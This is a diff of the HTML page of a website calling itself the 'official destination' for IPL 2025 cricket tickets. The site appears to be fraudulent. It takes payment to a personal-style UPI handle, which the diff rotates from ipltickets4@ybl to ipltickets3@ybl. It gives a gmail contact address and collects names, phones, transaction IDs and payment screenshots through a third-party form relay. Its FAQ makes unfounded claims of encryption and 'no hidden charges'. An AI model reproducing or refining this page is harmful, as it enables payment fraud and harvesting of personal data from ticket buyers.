+                <input type="hidden" name="amount" id="form-amount">
+                <input type="hidden" name="mobile" id="form-mobile">
+                <input type="hidden" name="match" id="form-match">
+                <input type="hidden" name="venue" id="form-venue">
+                <input type="hidden" name="seats" id="form-seats">
+                <input type="hidden" name="date" id="form-date">
+
+                <!-- Transaction Details -->
+                <div class="form-group">
+                  <label for="transaction-id">Transaction ID / UPI Reference
+                    No.</label>
+                  <input type="text" id="transaction-id" name="transactionId"
+                    required>
+                </div>
+
+                <div class="form-group">
+                  <label for="transaction-date">Payment Date & Time</label>
+                  <input type="datetime-local" id="transaction-date"
+                    name="transactionDate" required>
+                </div>
+
+                <div class="form-group">
+                  <label for="payment-screenshot">Payment Screenshot</label>
+                  <input type="file" id="payment-screenshot" name="attachment"
+                    accept="image/*" required>
+                  <small>Please upload a screenshot of your payment
+                    confirmation</small>
+                </div>
+
+                <div class="form-group">
+                  <label for="payment-remarks">Additional Information
+                    (Optional)</label>
+                  <textarea id="payment-remarks" name="remarks"
+                    rows="3"></textarea>
+                </div>
+
+                <button type="submit" class="confirmation-btn">Submit
+                  Details</button>
+              </form>
+            </div><div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- FAQ Section with Accordion Behavior -->
+      <section class="faq-section" id="faq">
+        <div class="container">
+          <h2 class="section-title">Frequently Asked Questions (FAQs)</h2>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>What is IPL 2025?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>IPL 2025 is the 18th season of the Indian Premier League,
+                featuring top cricketing talent from across India and the world.
+                Enjoy world-class matches at iconic stadiums.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>How do I book my tickets?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>Select your desired match from our schedule, choose your seats
+                via our interactive layout, and complete the secure payment
+                process. Your booking will be processed immediately.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>When will I receive my ticket?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>Once your payment is successfully processed, your ticket
+                details will be emailed to you within 6–8 hours. If you don't
+                see the email, please check your spam folder.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>What payment methods are available?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>We support UPI payments via Google Pay and QR code scanning
+                with any UPI app. All transactions are securely processed using
+                industry-standard encryption.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>Are all fees disclosed upfront?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>Yes. Service charges, taxes, and convenience fees are clearly
+                displayed during the booking process. There are no hidden
+                charges.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>Is my personal and payment information secure?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>Your security is our priority. Our platform uses robust
+                encryption and secure payment protocols to safeguard your
+                personal and financial information.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>What is the cancellation and refund policy?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>Cancellation and refund policies vary by match. Please review
+                the terms and conditions on the event page for detailed
+                information regarding cancellations and refunds.</p>
+            </div>
+          </div>
+
+          <div class="faq-item">
+            <button class="faq-question">
+              <h3>How can I get further assistance?</h3>
+              <span class="faq-toggle-icon"><i
+                  class="fas fa-chevron-down"></i></span>
+            </button>
+            <div class="faq-answer">
+              <p>If you have any questions or require support, please contact
+                our customer service team at <a
+                  href="mailto:goticketsindia2025@gmail.com">goticketsindia2025@gmail.com</a>
+                or call us at +91 99426 35225.</p>
+            </div>
+          </div>
+
+        </div>
+      </section>
+
+      <!-- Footer -->
+      <footer>
+        <div class="container">
+          <div class="footer-content">
+            <div class="footer-column">
+              <h3 class="footer-title">IPL Tickets</h3>
+              <p>Your official destination for Indian Premier League tickets.
+                Experience the cricketing extravaganza live in stadiums across
+                India.</p>
+              <div class="social-icons">
+                <a href="#" class="social-icon"><i
+                    class="fab fa-facebook-f"></i></a>
+                <a href="#" class="social-icon"><i
+                    class="fab fa-twitter"></i></a>
+                <a href="#" class="social-icon"><i
+                    class="fab fa-instagram"></i></a>
+                <a href="#" class="social-icon"><i
+                    class="fab fa-youtube"></i></a>
               </div>
             </div>
-            
-            <button type="button" id="next-step-btn" class="confirmation-btn">
-              Payment Completed, Continue
-            </button>
+            <div class="footer-column">
+              <h3 class="footer-title">Quick Links</h3>
+              <ul class="footer-links">
+                <li><a href="#">Home</a></li>
+                <li><a href="#schedule">Schedule</a></li>
+                <li><a href="#teams">Teams</a></li>
+                <li><a href="#venues">Venues</a></li>
+                <li><a href="#faq">FAQs</a></li>
+                <li><a href="#contact">Contact</a></li>
+              </ul>
+            </div>
+            <div class="footer-column">
+              <h3 class="footer-title">Help & Support</h3>
+              <ul class="footer-links">
+                <li><a href="#">Ticket Information</a></li>
+                <li><a href="#">Cancellation Policy</a></li>
+                <li><a href="#">Privacy Policy</a></li>
+                <li><a href="#">Terms & Conditions</a></li>
+                <li><a href="#">Refund Policy</a></li>
+              </ul>
+            </div>
+            <div class="footer-column">
+              <h3 class="footer-title" id="contact">Contact Us</h3>
+              <ul class="footer-links">
+                <!-- <li><i class="fas fa-map-marker-alt"></i> IPL Headquarters, Mumbai</li> -->
+                <li><i class="fas fa-phone"></i> +91 99426 35225</li>
+                <li><i class="fas fa-envelope"></i>
+                  goticketsindia2025@gmail.com</li>
+              </ul>
+            </div>
           </div>
-          
-          <div class="confirmation-step" id="confirmation-step-2">
-            <div class="step-indicator">2</div>
-            <h3>Submit Transaction Details</h3>
-            <p>Please provide your transaction details for verification.</p>
-            
-            <form action="https://formsubmit.co/b9dc2bf0b0bc14a5dba84c0db88ced9c" method="POST" id="confirmation-form">
-              <!-- Hidden inputs for FormSubmit settings -->
-              <input type="hidden" name="_subject" value="New IPL Ticket Payment Confirmation">
-              <input type="hidden" name="_captcha" value="false">
-              <input type="hidden" name="_next" value="https://goticketsindia.com/thankyou.html">
-              
-              <!-- Hidden fields with booking details -->
-              <input type="hidden" name="name" id="form-name">
-              <input type="hidden" name="email" id="form-email">
-              <input type="hidden" name="amount" id="form-amount">
-              <input type="hidden" name="mobile" id="form-mobile">
-              <input type="hidden" name="match" id="form-match">
-              <input type="hidden" name="venue" id="form-venue">
-              <input type="hidden" name="seats" id="form-seats">
-              <input type="hidden" name="date" id="form-date">
-              
-              <!-- Transaction Details -->
-              <div class="form-group">
-                <label for="transaction-id">Transaction ID / UPI Reference No.</label>
-                <input type="text" id="transaction-id" name="transactionId" required>
-              </div>
-              
-              <div class="form-group">
-                <label for="transaction-date">Payment Date & Time</label>
-                <input type="datetime-local" id="transaction-date" name="transactionDate" required>
-              </div>
-              
-              <div class="form-group">
-                <label for="payment-screenshot">Payment Screenshot</label>
-                <input type="file" id="payment-screenshot" name="screenshot" accept="image/*" required>
-                <small>Please upload a screenshot of your payment confirmation</small>
-              </div>
-              
-              <div class="form-group">
-                <label for="payment-remarks">Additional Information (Optional)</label>
-                <textarea id="payment-remarks" name="remarks" rows="3"></textarea>
-              </div>
-              
-              <button type="submit" class="confirmation-btn">Submit Details</button>
-            </form>
+          <div class="footer-bottom">
+            <p>&copy; 2025 IPL Tickets. All Rights Reserved.</p>
           </div>
         </div>
-      </div>
-    </div>
-  </div>
+      </footer>
+      <!-- Flatpickr JS -->
+      <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
 
-  <!-- FAQ Section with Accordion Behavior -->
-<section class="faq-section" id="faq">
-  <div class="container">
-    <h2 class="section-title">Frequently Asked Questions (FAQs)</h2>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>What is IPL 2025?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>IPL 2025 is the 18th season of the Indian Premier League, featuring top cricketing talent from across India and the world. Enjoy world-class matches at iconic stadiums.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>How do I book my tickets?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>Select your desired match from our schedule, choose your seats via our interactive layout, and complete the secure payment process. Your booking will be processed immediately.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>When will I receive my ticket?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>Once your payment is successfully processed, your ticket details will be emailed to you within 6–8 hours. If you don't see the email, please check your spam folder.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>What payment methods are available?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>We support UPI payments via Google Pay and QR code scanning with any UPI app. All transactions are securely processed using industry-standard encryption.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>Are all fees disclosed upfront?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>Yes. Service charges, taxes, and convenience fees are clearly displayed during the booking process. There are no hidden charges.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>Is my personal and payment information secure?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>Your security is our priority. Our platform uses robust encryption and secure payment protocols to safeguard your personal and financial information.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>What is the cancellation and refund policy?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>Cancellation and refund policies vary by match. Please review the terms and conditions on the event page for detailed information regarding cancellations and refunds.</p>
-      </div>
-    </div>
-    
-    <div class="faq-item">
-      <button class="faq-question">
-        <h3>How can I get further assistance?</h3>
-        <span class="faq-toggle-icon"><i class="fas fa-chevron-down"></i></span>
-      </button>
-      <div class="faq-answer">
-        <p>If you have any questions or require support, please contact our customer service team at <a href="mailto:goticketsindia2025@gmail.com">goticketsindia2025@gmail.com</a> or call us at +91 99426 35225.</p>
-      </div>
-    </div>
-    
-  </div>
-</section>
-
-  
-  <!-- Footer -->
-  <footer>
-    <div class="container">
-      <div class="footer-content">
-        <div class="footer-column">
-          <h3 class="footer-title">IPL Tickets</h3>
-          <p>Your official destination for Indian Premier League tickets. Experience the cricketing extravaganza live in stadiums across India.</p>
-          <div class="social-icons">
-            <a href="#" class="social-icon"><i class="fab fa-facebook-f"></i></a>
-            <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
-            <a href="#" class="social-icon"><i class="fab fa-instagram"></i></a>
-            <a href="#" class="social-icon"><i class="fab fa-youtube"></i></a>
-          </div>
-        </div>
-        <div class="footer-column">
-          <h3 class="footer-title">Quick Links</h3>
-          <ul class="footer-links">
-            <li><a href="#">Home</a></li>
-            <li><a href="#schedule">Schedule</a></li>
-            <li><a href="#teams">Teams</a></li>
-            <li><a href="#venues">Venues</a></li>
-            <li><a href="#faq">FAQs</a></li>
-            <li><a href="#contact">Contact</a></li>
-          </ul>
-        </div>
-        <div class="footer-column">
-          <h3 class="footer-title">Help & Support</h3>
-          <ul class="footer-links">
-            <li><a href="#">Ticket Information</a></li>
-            <li><a href="#">Cancellation Policy</a></li>
-            <li><a href="#">Privacy Policy</a></li>
-            <li><a href="#">Terms & Conditions</a></li>
-            <li><a href="#">Refund Policy</a></li>
-          </ul>
-        </div>
-        <div class="footer-column">
-          <h3 class="footer-title" id="contact">Contact Us</h3>
-          <ul class="footer-links">
-            <!-- <li><i class="fas fa-map-marker-alt"></i> IPL Headquarters, Mumbai</li> -->
-            <li><i class="fas fa-phone"></i> +91 99426 35225</li>
-            <li><i class="fas fa-envelope"></i> goticketsindia2025@gmail.com</li>
-          </ul>
-        </div>
-      </div>
-      <div class="footer-bottom">
-        <p>&copy; 2025 IPL Tickets. All Rights Reserved.</p>
-      </div>
-    </div>
-  </footer>
-  <!-- Flatpickr JS -->
-  <script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
-  
-  <!-- Scripts for Payment and Website Functionality -->
-  <script>
+      <!-- Scripts for Payment and Website Functionality -->
+      <script>
     // Global variables to store payment details
     let payerName = "";
     let payerEmail = "";
@@ -1920,7 +2026,7 @@ body.dark-mode .form-group small {
     const paymentConfirmedBtn = document.getElementById('payment-confirmed-btn');
     
     // Payment Gateway configuration
-    const upiBaseLink = "upi://pay?pa=ipltickets4@ybl&pn=goticketsindia&cu=INR";
+    const upiBaseLink = "upi://pay?pa=ipltickets3@ybl&pn=goticketsindia&cu=INR";
     const googlePayPackage = "com.google.android.apps.nbu.paisa.user"; // Android
     const googlePayScheme = "gpay://"; // iOS
     
@@ -1997,7 +2103,7 @@ body.dark-mode .form-group small {
         window.location.href = intentUrl;
       } else if (platform === "ios") {
         // iOS URL scheme for Google Pay
-        window.location.href = `${googlePayScheme}upi/pay?pa=ipltickets4@ybl&pn=goticketsindia&cu=INR&am=${parseFloat(totalAmount.replace(/[^0-9.]/g, ''))}`;
+        window.location.href = `${googlePayScheme}upi/pay?pa=ipltickets3@ybl&pn=goticketsindia&cu=INR&am=${parseFloat(totalAmount.replace(/[^0-9.]/g, ''))}`;
       } else {
         // Desktop fallback - show QR code
         alert("Please open this on a mobile device to use Google Pay directly, or use the QR code option.");
@@ -2026,7 +2132,7 @@ body.dark-mode .form-group small {
       const upiDetails = document.createElement('div');
       upiDetails.innerHTML = `
         <p style="margin-top: 10px; font-size: 14px;">
-          UPI ID: ipltickets4@ybl<br>
+          UPI ID: ipltickets3@ybl<br>
           Amount: ${totalAmount}
         </p>
       `;
@@ -2818,5 +2924,5 @@ const tzOffset = now.getTimezoneOffset() * 60000;
 const localISOTime = (new Date(Date.now() - tzOffset)).toISOString().slice(0, 16);
 document.getElementById('transaction-date').value = localISOTime;
   </script>
-</body>
-</html>
+    </body>
+  </html>
